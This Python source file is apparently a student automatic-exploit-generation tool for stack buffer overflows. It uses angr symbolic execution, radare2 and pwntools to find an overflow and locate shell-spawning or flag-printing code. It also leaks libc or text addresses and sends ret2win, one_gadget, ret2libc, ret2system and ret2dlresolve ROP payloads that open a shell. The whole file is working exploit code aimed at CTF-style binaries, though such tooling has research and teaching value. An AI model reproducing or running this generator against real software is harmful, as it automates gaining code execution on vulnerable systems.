#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from fileinput import filename
from gevent import kill
from py import process
import r2pipe
import json
import sys
sys.path.insert(0,'/home/trthanh/Desktop/DoAn-LTAT/bof_aeg/welpwn')

import IPython

import angr
from angr.storage.memory_mixins.address_concretization_mixin import MultiwriteAnnotation

from my_utils import *
pwn.context.log_level = 'debug'
pwn.context.arch = 'amd64'

############# 自定义函数 #############
class angr_gets(angr.SimProcedure):
    #pylint:disable=arguments-differ
    def run(self, dst):
        fd = 0
        simfd = self.state.posix.get_fd(fd)
        if simfd is None:
            return 0
            
        max_size = self.state.libc.max_gets_size

        # case 0: the data is concrete. we should read it a byte at a time since we can't seek for
        # the newline and we don't have any notion of buffering in-memory
        if simfd.read_storage.concrete:
            count = 0
            while count < max_size - 1:
                data, real_size = simfd.read_data(1)
                if self.state.solver.is_true(real_size == 0):
                    break
                self.state.memory.store(dst + count, data)
                count += 1
                if self.state.solver.is_true(data == b'\n'):
                    break
            self.state.memory.store(dst + count, b'\0')
            return dst

        # case 2: the data is symbolic, the newline could be anywhere. Read the maximum number of bytes
        # (SHORT_READS should take care of the variable length) and add a constraint to assert the
        # newline nonsense.
        # caveat: there could also be no newline and the file could EOF.
        else:
            data, real_size = simfd.read_data(max_size)

            for i, byte in enumerate(data.chop(8)):
                self.state.add_constraints(self.state.solver.If(
                    i+1 != real_size, 
                    byte != b'\n',
                    self.state.solver.Or(            # otherwise one of the following must be true:
                        i+2 == max_size,                 # - we ran out of space, or
                        simfd.eof(),                 # - the file is at EOF, or
                        byte == b'\n'                # - it is a newline
                    )))
            self.state.add_constraints(byte == b'\n')# gets最后加入\n

            self.state.memory.store(dst, data, size=real_size)
            end_address = dst + real_size - 1
            end_address = end_address.annotate(MultiwriteAnnotation())
            self.state.memory.store(end_address, b'\0')

            return dst
####################################

def overflow_detect_filter(simgr):
    """检测是否存在栈溢出漏洞
    """
    for state in simgr.unconstrained:
        if state.regs.pc.symbolic:
            pwn.log.info("Found vulnerable state.")
            bof_aeg.vuln_state = state.copy()

            tmp = list(state.regs.pc.variables)
            variables = []
            # 只保留stdin
            for i in tmp:
                if 'stdin' in i:
                    variables.append(i)

            if len(variables) > 1:
                pwn.log.error("Stack overflow caused by more than one stdin?")

            vuln_block = bof_aeg.project.factory.block(list(state.history.bbl_addrs)[-1])
            bof_aeg.vuln_addr = vuln_block.addr + vuln_block.size - 1
            pwn.log.info("Vuln_addr: 0x%x"%bof_aeg.vuln_addr)
            bof_aeg.vuln_input = b''.join(state.posix.stdin.concretize())

            for name,func in elf.functions.items():
                if func.address <= vuln_block.addr and vuln_block.addr < func.address+func.size:
                    pwn.log.info("Vuln_func(%s): 0x%x"%(name,func.address))
                    bof_aeg.vuln_func = func

            if state.regs.pc.symbolic:
                # 获取rbp+8(pc)之后的可控符号符号地址
                rbp = state.solver.eval(state.regs.rsp - 0x10)
                tmp = list(state.memory.addrs_for_name(variables[0]))
                tmp.sort()
                for i in range(len(tmp)):
                    if tmp[i] == rbp+8:
                        bof_aeg.vuln_control_addrs = tmp[i:]
                        break

            simgr.stashes["found"].append(state)
            simgr.stashes["unconstrained"].remove(state)
            break

    return simgr

class Bof_Aeg(object):
    def __init__(self):
        self.project = angr.Project(filepath, load_options={'auto_load_libs': False}, main_opts={'base_addr': 0x555555554000})
        self.project.hook_symbol('gets',angr_gets())
        self.cfg = self.project.analyses.CFG(normalize=True)

        add_options = {
            angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
            angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            angr.options.REVERSE_MEMORY_NAME_MAP,
            #angr.options.STRICT_PAGE_ACCESS, # Raise a SimSegfaultError on illegal memory accesses
            #angr.options.TRACK_ACTION_HISTORY,
        }
        remove_options = {
            #angr.options.LAZY_SOLVES
        }

        state = self.project.factory.entry_state(add_options=add_options,remove_options=remove_options)
        state.libc.buf_symbolic_bytes = 0x1000
        state.libc.max_str_len = 0x1000
        state.libc.max_gets_size = 0x200 # define gets() size; 溢出太长会影响system的envp

        self.entry_state = state.copy()

    def find_stack_bof(self):
        """探索栈溢出漏洞
        """
        pwn.log.info("Finding stack bof...")

        state = self.entry_state.copy()
        simgr = self.project.factory.simgr(state, save_unconstrained=True)
        simgr.explore(find=0xdeadbeef,step_func=overflow_detect_filter)

        if simgr.found == []:
            pwn.log.error("Cannot find stack bof.")

    def find_win(self):
        """
        寻找后门:
        1. system("/bin/sh") or system("cat flag")
        2. print flag to stdout
        """
        pwn.log.info("Finding win...")
        self.win_addr = 0

        # 寻找system("/bin/sh") or system("cat flag")
        if 'system' in elf.plt:
            system_node = self.cfg.model.get_any_node(elf.plt['system'])
            for pre in system_node.predecessors:
                # node可能被包含
                if pre.addr <= system_node.addr and pre.addr + pre.size < system_node.addr:
                    continue
                state = self.project.factory.blank_state(
                addr = pre.addr,
                mode = 'fastpath') # we don't want to do any solving
                simgr = self.project.factory.simgr(state)
                simgr.explore(find=pre.addr+pre.size-5)

                st = simgr.found[0]
                arg = st.memory.load(st.regs.rdi,8)
                if arg.uninitialized:
                    break
                cmd = st.solver.eval(st.memory.load(st.regs.rdi,8),cast_to=bytes)
                cmd13 = st.solver.eval(st.memory.load(st.regs.rdi,13),cast_to=bytes)
                if cmd in (b'/bin/sh\x00',b'cat flag') or cmd13 == b'/bin/cat flag':
                    self.win_addr = pre.addr
                    pwn.log.info("Found system(\"%s\") win_addr :0x%x"%(cmd, pre.addr))
                    return
        
        # 寻找print flag to stdout
        flag_addrs = []
        flag_addrs.extend(list(elf.search(b'flag\x00')))
        flag_addrs.extend(list(elf.search(b'flag.txt\x00')))

        for flag_addr in flag_addrs:
            xrefs = self.cfg.kb.xrefs.get_xrefs_by_dst(flag_addr)
            while xrefs != set():
                tmp = xrefs.pop()
                pwn.log.info("Testing flag block address :0x%x..."%tmp.block_addr)

                r2 = init_r2(filepath, b'')
                # 执行到main的第一个block末尾
                first_block = self.project.factory.block(elf.sym['main'])
                r2.cmd('dcu '+hex(\
                    first_block.addr+first_block.size-first_block.capstone.insns[-1].size))
                r2.cmd('dr rip='+hex(tmp.block_addr))
                r2.cmd('dc')
                with open(outputpath,'rb') as f:
                    if b'flag{test}' in f.read():
                        self.win_addr = tmp.block_addr
                        pwn.log.info("Found flag win_addr :0x%x"%self.win_addr)
                        return

        pwn.log.info("No win found!")
    
    def explore_to_win(self):
        """使用符号执行探索到win
        """
        pwn.log.info("Exploring to win...")
        if not self.win_addr:
            pwn.log.info("No win!")
            return
        
        state = self.entry_state.copy()
        simgr = self.project.factory.simgr(state)
        simgr.explore(find=self.win_addr)

        if simgr.found != []:
            pwn.log.success("Exploration success!")
            payload = b"".join(simgr.found[0].posix.stdin.concretize())
            p.sendline(payload)
            try:
                p.interactive()
            finally:
                killmyself()
        else:
            pwn.log.info("Exploration failed!")

    def find_leak(self):
        """查找程序中的地址泄漏
        """
        pwn.log.info("Finding text/libc leak...")
        self.has_text_leak = False
        self.has_libc_leak = False

        r2 = init_r2(filepath, b'')
        r2.cmd('dc')
        with open(outputpath,'rb') as f:
            data = f.read()
        map_data = json.loads(r2.cmd('dmj'))
        
        if (b'0x555555' in data or b'\x55'*3 in data): # text leak
            if b'0x555555' in data:
                aid = data.index(b'0x555555')
                leak = int(data[aid:aid+14],16)
                recv_str = data[:aid]
                recv_type = 'str'
            else:
                aid = data.rindex(b'\x55'*3)
                leak = pwn.u64(data[aid-5:aid+1].ljust(8,b'\x00'))
                recv_str = data[:aid-5]
                recv_type = 'byte'
            debug_test_base = 0
            for i in map_data:
                if elf.path in i['name']:
                    if not debug_test_base: debug_test_base = i['addr']
                    if i['addr'] <= leak and leak < i['addr_end']:
                        pwn.log.info("Found debug text leak: 0x%x"%leak)
                        self.has_text_leak = True
                        self.text_offset = leak - debug_test_base
                        break
        elif (b'0x7fff' in data or b'\xff\x7f' in data): # libc leak
            if b'0x7fff' in data:
                aid = data.index(b'0x7fff')
                leak = int(data[aid:aid+14],16)
                recv_str = data[:aid]
                recv_type = 'str'
            else:
                aid = data.rindex(b'\xff\x7f')
                leak = pwn.u64(data[aid-5:aid+1].ljust(8,b'\x00'))
                recv_str = data[:aid-5]
                recv_type = 'byte'
            debug_libc_base = 0
            for i in map_data:
                if libpath in i['name']:
                    if not debug_libc_base: debug_libc_base = i['addr']
                    if i['addr'] <= leak and leak < i['addr_end']:
                        pwn.log.info("Found debug libc leak: 0x%x"%leak)
                        self.has_libc_leak = True
                        self.libc_offset = leak - debug_libc_base
                        break

        if not self.has_text_leak and not self.has_libc_leak:
            pwn.log.error("PIE and No leak!")

        p.recvuntil(recv_str)
        if recv_type == 'str':
            leak = int(p.recv(14),16)
        elif recv_type == 'byte':
            leak = pwn.u64(p.recv(6).ljust(8,b'\x00'))

        if self.has_text_leak:
            pwn.log.info("Found remote text leak :0x%x"%leak)
            self.text_base = leak - self.text_offset
            pwn.log.info("text_base :0x%x"%self.text_base)
        elif self.has_libc_leak:
            pwn.log.info("Found remote libc leak :0x%x"%leak)
            self.libc_base = leak - self.libc_offset
            pwn.log.info("libc_base :0x%x"%self.libc_base)
        
        self.leak_recv_str = recv_str
        self.leak_recv_type = recv_type

    def get_shell(self):
        """根据分析情况选择漏洞利用技术
        """
        if self.win_addr:
            self.ret_to_win()
        if elf.pie and self.has_libc_leak: # 存在libc地址泄漏，ret to one_gadget/system
            self.ret_to_one()
            self.ret_to_system()
        elif not self.ret_to_libc(): # 没有可用于leak的函数
            self.ret_to_dlresolve()

    def ret_to_win(self):
        """修改返回地址为win
        """
        pwn.log.info("Trying tech{ret_to_win}...")

        win_addr = self.win_addr if not elf.pie else self.win_addr-elf.address+self.text_base
        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, pwn.p64(win_addr))
        payload = b''.join(state.posix.stdin.concretize())
        
        # system has movaps(check rsp & 0xf == 0)
        global p
        p.sendline(payload)
        try:
            res = p.recvuntil(b'flag{test}',timeout=0.1)
            if b'flag{test}' in res:
                print(res)
                p.close()
                killmyself()

            p.sendline(b'cat flag')
            res = p.recvuntil(b'flag{test}',drop=False)
            print(res)
            p.interactive()
        except KeyboardInterrupt:
            killmyself()
        except: # 后门失败,有可能是system的栈对齐问题
            p.close()
            p = pwn.process(filepath, env={'LD_LIBRARY_PATH':libpath})
            if elf.pie: # 需要重新leak
                if self.leak_recv_type == 'str':
                    leak = int(p.recv(14),16)
                elif self.leak_recv_type == 'byte':
                    leak = pwn.u64(p.recv(6).ljust(8,b'\x00'))
                pwn.log.info("Found remote text leak :0x%x"%leak)
                self.text_base = leak - self.text_offset
                pwn.log.info("text_base :0x%x"%self.text_base)

            rop = self.get_rop()
            state = self.vuln_state.copy()
            set_concrete(state, self.vuln_control_addrs, pwn.p64(rop.search(regs=['rdi']).address+1)+pwn.p64(win_addr))
            payload = b''.join(state.posix.stdin.concretize())
            p.sendline(payload)
            try:
                p.interactive()
            finally:
                killmyself()

    def ret_to_one(self):
        """存在libc地址泄漏, ret to one_gadget
        """
        pwn.log.info("Trying tech{ret_to_one}...")

        r2 = init_r2(filepath, self.vuln_input)
        r2.cmd('dcu '+hex(self.vuln_addr))
        one_offset = check_r2_one(r2, stack_off=8)

        if not one_offset:
            pwn.log.info("No one_offset found!")
            return
        pwn.log.info("Found one_offset :0x%x"%one_offset)

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, pwn.p64(self.libc_base+one_offset)[:6])
        getshell = b''.join(state.posix.stdin.concretize())
        p.sendline(getshell)
        try:
            p.interactive()
        finally:
            killmyself()

    def ret_to_system(self):
        """存在libc地址泄漏, ret to system
        """
        pwn.log.info("Trying tech{ret_to_system}...")

        tmp_libc = pwn.ELF(libpath+'libc.so.6',checksec=False)
        tmp_libc.address = self.libc_base
        try:
            pwn.ROP.clear_cache()
        except:
            pass
        rop = pwn.ROP(tmp_libc)
        rop.call(tmp_libc.sym['system'], [next(tmp_libc.search(b'/bin/sh\x00'))])
        
        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, rop.chain())
        getshell = b''.join(state.posix.stdin.concretize())
        p.sendline(getshell)
        try:
            p.interactive()
        finally:
            killmyself()

    def ret_to_libc(self):
        """
        首先构造rop链泄漏libc地址,
        然后利用return-to-libc技术执行system("/bin/sh")
        """
        pwn.log.info("Trying tech{ret_to_libc}...")

        leak_got = None
        rop = self.get_rop()
        if 'puts' in elf.plt:
            leak_got = 'puts'
        elif 'printf' in elf.plt:
            leak_got = 'printf' # 可能会有movaps栈对齐检查

        if not leak_got:
            pwn.log.info("No stdout function available for leak.")
            return False
        pwn.log.info("Found leak_got :"+leak_got)

        leak_addr = elf.got[leak_got] if not elf.pie else elf.got[leak_got]-elf.address+self.text_base
        rop.call(leak_got, [leak_addr])

        vuln_func_addr = self.vuln_func.address if not elf.pie else self.vuln_func.address-elf.address+self.text_base
        
        payload = b''
        payload += pwn.p64(rop.rdi.address+1) # movaps align
        payload += rop.chain()
        payload += pwn.p64(vuln_func_addr)

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, payload)
        rop_chain = b''.join(state.posix.stdin.concretize())

        p.send(rop_chain)

        leak_addr = pwn.u64(p.recvuntil(b'\x7f',drop=False)[-6:].ljust(8,b'\x00'))
        pwn.log.info("leak_addr: 0x%x"%leak_addr)

        libc = pwn.ELF(libpath+'libc.so.6',checksec=False)
        libc_base = leak_addr - libc.sym[leak_got]
        pwn.log.info("libc_base: 0x%x"%libc_base)

        system_addr = libc_base + libc.sym['system']
        pwn.log.info("system_addr: 0x%x"%system_addr)

        binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
        pwn.log.info("binsh_addr: 0x%x"%binsh_addr)

        rop = self.get_rop()
        rop.call(system_addr, [binsh_addr])

        payload = b''
        #payload += pwn.p64(rop.rdi.address+1) # movaps align
        payload += rop.chain()

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, payload)
        getshell = b''.join(state.posix.stdin.concretize())
        p.sendline(getshell)
        try:
            p.interactive()
        finally:
            killmyself()

    def ret_to_dlresolve(self):
        pwn.log.info("Trying tech{ret_to_dlresolve}...")

        rop, dlresolve = self.get_rop(need_dlresolve=True)
        
        if 'gets' in elf.plt:
            rop.call('gets',[dlresolve.data_addr])
        elif 'read' in elf.plt:
            rop.call('read',[0,dlresolve.data_addr])
            
        rop.ret2dlresolve(dlresolve)

        state = self.vuln_state.copy()
        set_concrete(state, self.vuln_control_addrs, rop.chain())
        rop_chain = b''.join(state.posix.stdin.concretize())
        p.send(rop_chain)
        pwn.sleep(0.1)
        p.sendline(dlresolve.payload)
        try:
            p.interactive()
        finally:
            killmyself()

    def get_rop(self, need_dlresolve=False):
        """根据pie情况返回pwnlib.rop.rop和dlresolve
        """
        try:
            pwn.ROP.clear_cache()
        except:
            pass
        if elf.pie:
            tmp = pwn.ELF(filepath,checksec=False)
            tmp.address = self.text_base
            rop = pwn.ROP(tmp)
            if need_dlresolve:
                dlresolve = pwn.Ret2dlresolvePayload(tmp, symbol="system", args=["/bin/sh\x00"])
        else:
            rop = pwn.ROP(elf)
            if need_dlresolve:
               dlresolve = pwn.Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh\x00"])
        if not need_dlresolve:
            return rop
        else:
            return rop, dlresolve

if __name__ == '__main__':

    global filepath
    filepath = sys.argv[1]

    global inputpath, outputpath
    inputpath = "./input.txt"
    outputpath = "./output.txt"

    libpath = "/home/trthanh/Desktop/DoAn-LTAT/bof_aeg/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/"
    init_profile(filepath, libpath, inputpath, outputpath)

    pwn.ctx.binary = filepath
    pwn.ctx.custom_lib_dir = libpath
    pwn.ctx.debug_remote_libc = True
    global p
    p = pwn.ctx.start()
    p = pwn.process(filepath, env={'LD_PRELOAD':libpath+'ld-linux-x86-64.so.2','LD_LIBRARY_PATH':libpath})

    global elf
    pwn.context.binary = elf = pwn.ELF(filepath, checksec=False)
    if elf.pie : elf.address = 0x555555554000

    global static_r2
    static_r2 = r2pipe.open(filepath) if not elf.pie \
        else r2pipe.open(filepath,flags=['-B','0x555555554000'])
    static_r2.cmd('aaa')
    
    plt = {}
    for i in json.loads(static_r2.cmd('iij')):
        if i['plt'] and i['plt'] != 0x555555554000: plt[i['name']] = i['plt']
    elf.plt = plt
    
    global bof_aeg
    bof_aeg = Bof_Aeg()
    bof_aeg.find_win()

    if elf.pie:
        # 直接使用符号执行探索到win
        bof_aeg.explore_to_win()
        # 寻找程序中的地址泄漏
        bof_aeg.find_leak()

    bof_aeg.find_stack_bof()
    bof_aeg.get_shell()
